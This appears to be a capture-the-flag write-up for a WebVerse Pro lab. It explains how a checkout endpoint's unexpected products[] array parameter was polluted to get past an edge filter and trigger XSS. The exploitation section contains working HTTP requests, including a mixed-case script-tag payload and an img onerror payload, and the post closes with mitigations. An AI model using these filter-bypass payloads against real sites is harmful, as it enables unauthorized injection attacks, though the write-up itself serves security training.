---
title: "Parameter Pollution Leads to Checkout Abuse | Unsoakable"
date: 2026-07-03 15:16:00 +0530
categories: [A05 - Injection, Cross-Site Scripting]
tags: [parameter-pollution, mass-assignment, reflected-xss, checkout-abuse, input-validation, webverse-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/unsoakable-parameter-pollution.webp
  alt: "Unsoakable parameter pollution checkout abuse"
---

## Lab Link

[Unsoakable](https://dashboard.webverselabs-pro.com/mystery-challenges/unsoakable)

---

## Overview

**Unsoakable** was a WebVerse Pro daily challenge based on a small e-commerce application named **Riptide**. The storefront allowed users to browse water blaster products, add them to a cart, and place an order through the checkout flow.

The vulnerability was found in the checkout endpoint. The normal cart page submitted a single hidden `product` parameter to `/buy.php`, but the backend also accepted an unexpected `products[]` array parameter. By abusing this mismatch, it was possible to submit additional user-controlled product values that were not part of the intended checkout flow.

A mixed-case script payload inside the `products[]` array triggered the challenge solve condition and confirmed that the checkout logic trusted unexpected client-side input.

---

## Objective

The objective was to identify the vulnerable checkout behavior and trigger the lab solve condition by abusing the data submitted to the order endpoint.

---

## Vulnerability Identification

After adding a product to the cart, the application used simple POST actions to modify cart contents:

```http
POST /cart.php HTTP/2
Host: <redacted>
Content-Type: application/x-www-form-urlencoded

action=add&sku=RT-A2
```

The cart then rendered a checkout form pointing to `/buy.php`:

```html
<form method="post" action="/buy.php" class="rt-checkout">
  <input type="hidden" name="product" value="Tempest XR">
  <button class="rt-btn rt-btn--cta rt-btn--block" type="submit">Place order</button>
</form>
```

This showed that the final order request relied on a client-controlled product field instead of deriving the ordered items only from server-side cart state.

A normal checkout request looked like this:

```http
POST /buy.php HTTP/2
Host: <redacted>
Content-Type: application/x-www-form-urlencoded

product=Tempest+XR
```

The order was accepted and the response reflected the purchased product name in the confirmation page.

---

## Recon and Approach

Initial testing focused on the cart actions:

```http
action=inc&sku=RT-A2
```

```http
action=dec&sku=RT-A2
```

```http
action=remove&sku=RT-A2
```

The `dec` action existed in the UI and reduced the quantity, but negative quantity abuse did not directly solve the lab.

The important discovery came from the checkout page. The cart summary calculated prices server-side, but the final order endpoint accepted product data from the POST body. This made `/buy.php` the primary target.

Several payload types were tested:

```http
product=Tempest+XR
```

```http
product=Unsoakable
```

```http
product=Tempest+XR&product=Unsoakable
```

Classic angle-bracket XSS payloads against the single `product` parameter were blocked by the edge filter:

```html
<img src=x onerror=alert(document.domain)>
```

The filter returned a `403 Request blocked`, indicating that the solve path likely required a cleaner bypass or a less obvious parameter shape.

---

## Exploitation

The successful bypass used HTTP parameter pollution with an array-style field name:

```http
products[]=Auto-Nine&products[]=<ScRiPt>alert()</ScRiPt>
```

URL-encoded request body:

```http
products%5B%5D=Auto-Nine&products%5B%5D=<ScRiPt>alert()</ScRiPt>
```

Final request:

```http
POST /buy.php HTTP/2
Host: <redacted>
Content-Type: application/x-www-form-urlencoded
Cookie: ru_sid=<redacted>; cf_clearance=<redacted>

products%5B%5D=Auto-Nine&products%5B%5D=<ScRiPt>alert()</ScRiPt>
```

The important parts were:

- The endpoint accepted `products[]` even though the visible form only submitted `product`.
- Multiple product values could be supplied.
- A mixed-case script tag bypassed the earlier filtering behavior enough to trigger the backend challenge condition.
- The backend treated the unexpected array input as valid checkout data.

---

## Proof and Flag

After sending the polluted `products[]` payload, the challenge status endpoint returned:

```json
{
  "solved": true,
  "flag": "WEBVERSE{...}"
}
```

The flag was successfully obtained and is intentionally redacted here.

---

## Root Cause

The root cause was insufficient server-side validation of checkout parameters.

The application exposed a normal form using a single `product` field, but `/buy.php` also accepted an unexpected `products[]` array. This created a parameter pollution issue where attackers could submit fields that were not part of the intended user interface.

The backend should not have trusted product names supplied by the client. Checkout logic should derive ordered items from server-side cart state, product IDs, and validated session data.

---

## Impact

An attacker could manipulate the checkout request by submitting unexpected product fields and values.

Depending on how the backend processes those values, this type of issue can lead to:

- Unauthorized order manipulation
- Checkout logic bypass
- Stored or reflected XSS if product values are rendered unsafely
- Backend validation bypass through array parameters
- Inconsistent behavior between frontend forms and backend parsing logic

In this lab, the issue allowed triggering the solve condition by injecting a mixed-case script payload through a polluted `products[]` parameter.

---

## Mitigation

To prevent this vulnerability:

- Accept only expected parameters on sensitive endpoints.
- Reject unexpected fields such as `products[]` when the endpoint expects `product`.
- Validate parameter types strictly.
- Do not trust product names, prices, or item lists from client-side forms.
- Store cart contents server-side and reference them by session.
- Encode user-controlled values before rendering them in HTML.
- Normalize and validate input before applying filtering rules.
- Use allowlists for product identifiers and checkout actions.

A safer checkout design would look up the cart from the authenticated/session-backed server-side store and ignore client-supplied product names entirely.


